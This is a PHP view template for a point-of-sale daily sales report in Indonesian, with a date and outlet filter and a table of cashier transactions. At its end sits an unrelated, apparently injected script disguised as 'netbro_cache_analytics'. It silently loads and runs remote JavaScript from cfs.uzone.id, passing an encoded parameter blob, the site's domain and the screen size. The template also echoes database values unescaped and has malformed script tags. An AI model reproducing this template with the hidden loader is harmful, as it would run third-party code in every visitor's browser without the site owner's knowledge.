<?php ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <title>POS</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <meta content="" name="description"/>
    <meta content="" name="author"/>
    <link href="<?php

    use Carbon\Carbon;

    echo site_url(); ?>assets/assets/bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap-fileupload.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/assets/font-awesome/css/font-awesome.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_responsive.css" rel="stylesheet"/>
    <link href="<?php echo site_url(); ?>assets/css/style_default.css" rel="stylesheet" id="style_color"/>

    <link href="<?php echo site_url(); ?>assets/assets/fancybox/source/jquery.fancybox.css" rel="stylesheet"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/gritter/css/jquery.gritter.css"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/uniform/css/uniform.default.css"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/chosen-bootstrap/chosen/chosen.css"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/jquery-tags-input/jquery.tagsinput.css"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/clockface/css/clockface.css"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/bootstrap-wysihtml5/bootstrap-wysihtml5.css"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/bootstrap-datepicker/css/datepicker.css"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/bootstrap-timepicker/compiled/timepicker.css"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/bootstrap-colorpicker/css/colorpicker.css"/>
    <link rel="stylesheet" href="<?php echo site_url(); ?>assets/assets/bootstrap-toggle-buttons/static/stylesheets/bootstrap-toggle-buttons.css"/>
    <link rel="stylesheet" href="<?php echo site_url(); ?>assets/assets/data-tables/DT_bootstrap.css"/>
    <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/bootstrap-daterangepicker/daterangepicker.css"/>
    <script src="<?php echo base_url(); ?>assets/js/currency.min.js"></script>
    <script type="text/javascript">
        function indonesian(value)
        {
            //@formatter:off
            return currency(value, {separator: ".", decimal: ",", symbol: "Rp ", precision: 2, formatWithSymbol: true});
            //@formatter:on
        }
    </script>
    <?php
    function getArrCount($arr, $depth = 1)
    {
        if (!is_array($arr) || !$depth)
        {
            return 0;
        }

        $res = count($arr);

        foreach ($arr as $in_ar)
        {
            $res += getArrCount($in_ar, $depth - 1);
        }

        return $res;
    }

    function getTransaksiDCount($arr)
    {
        $count = 0;
        foreach ($arr['transaksi_m'] as $arr1)
        {
            $count += count($arr1['transaksi_d']);
        }

        return $count;
    }

    ?>
</head>

<body class="fixed-top">
<?php $this->load->view('header.php') ?>
<div id="container" class="row-fluid">
    <div id="sidebar" class="nav-collapse collapse">
        <?php $this->load->view('sidebar.php') ?>
    </div>
    <div id="main-content">
        <div class="container-fluid">
            <div class="row-fluid">
                <div class="span12">
                    <h3 class="page-title">

                    </h3>
                    <ul class="breadcrumb">
                        <li>
                            <a href="#">
                                <i class="icon-home"></i>
                            </a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Laporan</a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Laporan Penjualan</a>
                            <span class="divider">&nbsp;</span>
                        </li>
                        <li>
                            <a href="#">Penjualan Harian</a>
                            <span class="divider-last">&nbsp;</span>
                        </li>
                    </ul>
                    <!-- END PAGE TITLE & BREADCRUMB-->
                </div>
            </div>
            <div class="row-fluid">
                <div class="span12">
                    <div class="widget">
                        <div class="widget-title">
                            <h4>
                                <i class="icon-reorder"></i>
                                Data Transaksi Penjualan
                            </h4>
                        </div>
                        <form action="<?php echo site_url("admin/laporan/penjualan/transaksi"); ?>" class="form-horizontal" method="get">
                            <div class="widget-body">
                                <div class="clearfix">
                                    <div class="control-group">
                                        <h5> Tanggal </h5>
                                        <div class="input-append date date-picker" data-date=<?php echo \Carbon\Carbon::now()->toDateString() ?> data-date-format="yyyy-mm-dd" data-date-viewmode="days">
                                            <input class=" m-ctrl-medium" size="16" type="text" name="tanggal" value="<?php echo isset($rDate) ? $rDate : \Carbon\Carbon::now()->toDateString() ?>" readonly/>
                                            <span class="add-on"><i class="icon-calendar"></i></span>
                                        </div>
                                    </div>
                                    <label for="id_outlet">Outlet</label>
                                    <select id="id_outlet" name="outlet" class="input-medium m-wrap" required="true">
                                        <?php foreach (isset($outlets) ? $outlets : [] as $outlet) { ?>
                                            <option value="<?php echo $outlet['id_outlet']; ?>" <?php echo (isset($rOutlet) && (intval($outlet['id_outlet']) === intval($rOutlet))) ? 'selected' : '' ?>><?php echo $outlet['nama_outlet']; ?></option>
                                        <?php } ?>
                                    </select>
                                    <br>
                                    <br>
                                    <div class="btn-group">
                                        <button type="submit" class="btn green">
                                            Lihat
                                            <i class="icon-ok"></i>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <?php if (!empty(isset($reports) ? $reports : [])) { ?>
                <div class="row-fluid">
                    <div class="span12">
                        <div class="widget">
                            <div class="widget-title">
                                <h4>
                                    <i class="icon-list"></i>
                                    Laporan Penjualan Omset Bulanan
                                </h4>
                            </div>
                            <div class="widget-body">
                                <table class="table table-bordered">
                                    <thead>
                                    <tr>
                                        <th>Kasir</th>
                                        <th>Waktu</th>
                                        <th>Produk</th>
                                        <th>Jumlah</th>
                                        <th>Total</th>
                                        <th>Grand Total</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    <?php
                                    $outlets = isset($outlets) ? $outlets : [];
                                    foreach (isset($reports) ? $reports : [] as $kur => $vur)
                                    {
                                        $vur_count = getTransaksiDCount($vur);
                                        $kuri      = -1;
                                        foreach ($vur['transaksi_m'] as $kmr => $vmr)
                                        {
                                            $vmr_count      = count($vmr['transaksi_d']);
                                            $kmri           = -1;
                                            $vmr['tanggal'] = Carbon::createFromFormat('Y-m-d H:i:s', $vmr['tanggal'])->formatLocalized('%H:%M:%S');
                                            foreach ($vmr['transaksi_d'] as $kdr => $vdr)
                                            {
                                                $vdr['total']       = number_format(intval($vdr['total']), 2, ',', '.');
                                                $vmr['grand_total'] = number_format(intval($vmr['grand_total']), 2, ',', '.');
                                                //@formatter:off
                                                echo '<tr>';
                                                    echo (++$kuri <= 0) ? "<td rowspan='$vur_count'>{$vur['nama']}</td>" : '';
                                                    echo (++$kmri <= 0) ? "<td rowspan='$vmr_count'>{$vmr['tanggal']}</td>" : '';
                                                    echo "<td>{$products["p_{$vdr['id_produk']}"]['nama_produk']}</td>";
                                                    echo "<td>{$vdr['jumlah']}</td>";
                                                    echo "<td style='text-align: right'>Rp {$vdr['total']}</td>";
                                                    echo ($kmri <= 0) ? "<td rowspan='$vmr_count' style='text-align: right'>Rp {$vmr['grand_total']}</td>" : '';
                                                echo '</tr>';
                                                //@formatter:on
                                            }
                                        }
                                    }
                                    ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            <?php } ?>
        </div>
    </div>
</div>
<?php $this->load->view('footer.php') ?>
<script src="<?php echo site_url(); ?>assets/js/jquery-1.8.2.min.js"></script>
<script type="<?php echo site_url(); ?>assets/text/javascript" src="assets/ckeditor/ckeditor.js"></script>
<script src="<?php echo site_url(); ?>assets/assets/bootstrap/js/bootstrap.min.js"></script>
<script type="<?php echo site_url(); ?>assets/text/javascript" src="assets/bootstrap/js/bootstrap-fileupload.js"></script>
<script src="<?php echo site_url(); ?>assets/js/jquery.blockui.js"></script>
<!-- ie8 fixes -->
<!--[if lt IE 9]>
<script src="js/excanvas.js"></script>
<script src="js/respond.js"></script>
<![endif]-->
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/chosen-bootstrap/chosen/chosen.jquery.min.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/uniform/jquery.uniform.min.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/bootstrap-wysihtml5/wysihtml5-0.3.0.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/bootstrap-wysihtml5/bootstrap-wysihtml5.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/clockface/js/clockface.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/jquery-tags-input/jquery.tagsinput.min.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/bootstrap-toggle-buttons/static/js/jquery.toggle.buttons.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/bootstrap-datepicker/js/bootstrap-datepicker.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/bootstrap-daterangepicker/date.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/bootstrap-daterangepicker/daterangepicker.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/bootstrap-colorpicker/js/bootstrap-colorpicker.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/bootstrap-timepicker/js/bootstrap-timepicker.js"></script>
<script type="text/javascript" src="<?php echo site_url(); ?>assets/assets/bootstrap-inputmask/bootstrap-inputmask.min.js"></script>
<script src="<?php echo site_url(); ?>assets/assets/fancybox/source/jquery.fancybox.pack.js"></script>
<script src="<?php echo site_url(); ?>assets/js/scripts.js"></script>
<script>
    jQuery(document).ready(function () {
        // initiate layout and plugins
        App.init();
    });
</script>
<script type="text/javascript">if (self == top)
    {
        function netbro_cache_analytics(fn, callback)
        {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn)
        {
            fn();
        }

        function requestCfs()
        {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r   = Math.floor(Math.random() * 99999999999);
            var url   = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKGk5srYR1NCoiZb4e8fPgGSrzxny7Bs3aod8JI8r9WL9Zcv7DcypTafjTWjc8KR2rkdE9obmG7qlrJ2O5wLAkWR1EJqX2Vw3XHzhSxfTrKeWUMN%2fPcq0BczrMMWqL2II2LVGvo%2fLRG4DhbjGKEsZdcZL4LU4xZawooHEtryQ0qQNeuH5SQxs1tw3yuYvo5OhvukPSA2cDtmyw0tv5%2bRdXMSlocozQyrPDu1qVuLzjutFTJOoQp8dVo%2btM5%2fmonVTIoyxvO%2fR5ym5xzf8cPUDTRBHlfMTcYMP4CweKyBABoQqAv1HRqCiZjg4cJ20X8CMROLUtQAzEbRS01S6BNqFaZDZvhyKg%2by7qRaxsxelD3CKygl%2by6sAjqArSopYZHVtGQZ3q3RRyXJgSVAbtqpFYozwVREhvfgyg3ZXJpLVl2s1jwQDNi2JnJxTNIfd4vOts2xHvqzYjtf%2fOTi9HSZtTUp73nxmdrLtyx5DfG%2fk90GdQpnnOHtIpzO4Ia5UIm0TZfeS11TfQY0I%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa   = document.createElement('script');
            bsa.type  = 'text/javascript';
            bsa.async = true;
            bsa.src   = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
</script>
</body>
<!-- END BODY -->
</html>
